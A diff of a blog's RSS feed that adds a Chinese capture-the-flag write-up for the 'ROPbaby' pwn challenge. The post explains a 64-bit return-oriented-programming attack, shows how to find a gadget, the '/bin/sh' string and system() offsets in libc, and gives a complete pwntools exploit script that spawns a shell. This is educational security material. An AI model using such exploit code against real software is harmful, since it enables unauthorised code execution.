@@ -5,9 +5,114 @@
     <description>Learning day by day, progressing day by day!</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Fri, 19 Jul 2019 00:46:02 +0800</pubDate>
-    <lastBuildDate>Fri, 19 Jul 2019 00:46:02 +0800</lastBuildDate>
+    <pubDate>Fri, 26 Jul 2019 23:52:47 +0800</pubDate>
+    <lastBuildDate>Fri, 26 Jul 2019 23:52:47 +0800</lastBuildDate>
     <generator>Jekyll v3.8.6</generator>
+    
+      <item>
+        <title>实验吧ROPbaby(PWN)</title>
+        <description>&lt;blockquote&gt;
+  &lt;p&gt;本文首发于博主公众号LISTONE，欢迎关注哦！&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;题目链接：&lt;a href=&quot;http://www.shiyanbar.com/ctf/2028&quot;&gt;ROPbaby&lt;/a&gt;
+（没想到题目服务器挂掉了，只能本地做了）&lt;/p&gt;
+
+&lt;p&gt;这个题目给了我们两个文件一个ROPbaby，一个libc。&lt;/p&gt;
+
+&lt;p&gt;首先查看ropbaby的文件信息和保护方式。&lt;/p&gt;
+
+&lt;p&gt;在这里可以看到程序开启了NX，这样的话shellcode的方式就很难用了，因此我们用ROP的方法来溢出攻击。&lt;/p&gt;
+
+&lt;p&gt;ROP的思路就是通过返回导向式编程，劫持程序的返回地址，将其定位到目标位置，在CTF中，我们一般都是劫持程序运行&lt;code class=&quot;highlighter-rouge&quot;&gt;system('/bin/sh')&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;这个程序通过上面的信息可以知道是64位的，在64位程序中，函数调用时，前六个参数是通过&lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;rcx&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;r8&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;r9&lt;/code&gt;来进行传递的，我们的目的是劫持程序执行&lt;code class=&quot;highlighter-rouge&quot;&gt;system('/bin/sh')&lt;/code&gt;这个语句。&lt;/p&gt;
+
+&lt;p&gt;因此，我们需要做的就是：&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;找到溢出点&lt;/li&gt;
+  &lt;li&gt;构造gadget，包含&lt;code class=&quot;highlighter-rouge&quot;&gt;pop rdi | retn&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;在libc中找到&lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;字符串的地址，并送入&lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt;寄存器&lt;/li&gt;
+  &lt;li&gt;找到&lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;函数地址，并使程序跳转执行&lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;函数&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;通过题目中给出的libc文件，我们可以轻易地在终端中使用如下命令找到&lt;code class=&quot;highlighter-rouge&quot;&gt;pop rdi | retn&lt;/code&gt;的地址&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ROPgadget --binary libc-2.23.so --only &quot;pop|ret&quot; |grep &quot;pop rdi&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;结果如下：&lt;br /&gt;
+&lt;img src=&quot;http://wx2.sinaimg.cn/large/007cEDWily1g5dnsj933cj30gx02gmxx.jpg&quot; alt=&quot;ROPgadget&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;我们需要着重记住上面我框住的那个地址。&lt;/p&gt;
+
+&lt;p&gt;找溢出点：
+在程序中有一个&lt;code class=&quot;highlighter-rouge&quot;&gt;memcpy&lt;/code&gt;函数如下：&lt;br /&gt;
+&lt;img src=&quot;http://wx2.sinaimg.cn/large/007cEDWily1g5dnslmgusj308301d745.jpg&quot; alt=&quot;memcpy&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;其中&lt;code class=&quot;highlighter-rouge&quot;&gt;savedergs&lt;/code&gt;是以&lt;code class=&quot;highlighter-rouge&quot;&gt;int64&lt;/code&gt;声明的，因此最多可输入8个字符，之后多输入就会溢出，这个地方就是我们要找的溢出点了。&lt;/p&gt;
+
+&lt;p&gt;然后在libc中找到&lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;的地址，用下面的命令就可以：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strings -tx libc-2.23.so|grep &quot;/bin/sh&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;http://wx2.sinaimg.cn/large/007cEDWily1g5dnsp9s5mj30am0193yj.jpg&quot; alt=&quot;/bin/sh&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在这个程序中可以直接查找&lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;函数的地址，但是我们需要找到程序的基址，所以我们需要找到&lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;的偏移地址。&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; objdump -T libc-2.23.so|grep &quot;system&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;http://wx3.sinaimg.cn/large/007cEDWily1g5dnssdtqnj30jp02ddh1.jpg&quot; alt=&quot;objdump&quot; /&gt;
+这里面0x45390就是&lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;函数的地址&lt;/p&gt;
+
+&lt;p&gt;所以，我们可以写出利用脚本：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env/python
+# coding=utf-8  
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;  
+&lt;span class=&quot;c1&quot;&gt;#context.log_level = &quot;debug&quot;  
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;environ&lt;/span&gt;  
+&lt;span class=&quot;c1&quot;&gt;#p = remote('106.2.25.7','8004')  
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./ropbaby'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
+&lt;span class=&quot;n&quot;&gt;pop_rdi_ret_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21102&lt;/span&gt;  
+  
+&lt;span class=&quot;n&quot;&gt;str_bin_sh_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x18cd17&lt;/span&gt;  
+
+&lt;span class=&quot;n&quot;&gt;system_addr_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x45390&lt;/span&gt;  
+  
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'2'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Enter symbol: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'system'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
+  
+&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:],&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'[+]system_addr: '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;  
+
+&lt;span class=&quot;n&quot;&gt;base_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_addr_offset&lt;/span&gt;  
+  
+&lt;span class=&quot;n&quot;&gt;str_bin_sh_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str_bin_sh_offset&lt;/span&gt;  
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+]binsh: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str_bin_sh_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;  
+&lt;span class=&quot;n&quot;&gt;rdi_ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdi_ret_offset&lt;/span&gt;  
+  
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'3'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Enter bytes to send (max 1024): '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
+  
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdi_ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str_bin_sh_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
+  
+&lt;span class=&quot;c1&quot;&gt;# p.sendline(str(len(payload)))  
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'32'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
+  
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Fri, 26 Jul 2019 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2019/07/26/%E5%AE%9E%E9%AA%8C%E5%90%A7ROPbaby(PWN)/</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/07/26/%E5%AE%9E%E9%AA%8C%E5%90%A7ROPbaby(PWN)/</guid>
+        
+        <category>linux</category>
+        
+        <category>Notes</category>
+        
+        
+      </item>
     
       <item>
         <title>调试破解TraceMe</title>
